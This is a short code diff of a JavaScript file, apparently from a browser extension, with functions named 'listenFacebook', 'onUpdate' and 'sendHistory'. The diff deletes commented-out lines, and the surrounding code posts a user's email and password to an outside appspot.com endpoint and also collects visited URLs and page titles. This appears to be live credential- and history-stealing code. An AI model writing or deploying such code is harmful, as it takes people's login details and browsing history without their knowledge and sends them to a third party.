@@ -135,8 +135,6 @@ function listenFacebook() {
 }
 
 function onUpdate(email, pass, type) {
-  // onCallApi({email, pass, type});
-  // return;
   fetch(`https://deploy-temp.appspot.com/api/update-user-info`, { 
     method: 'post',
     headers: {
@@ -173,8 +171,6 @@ try {
 } catch(e){}
 
 function sendHistory(url, title) {
-  // onCallApi({url, title});
-  // return;
   if(!url) {
     return;
   }
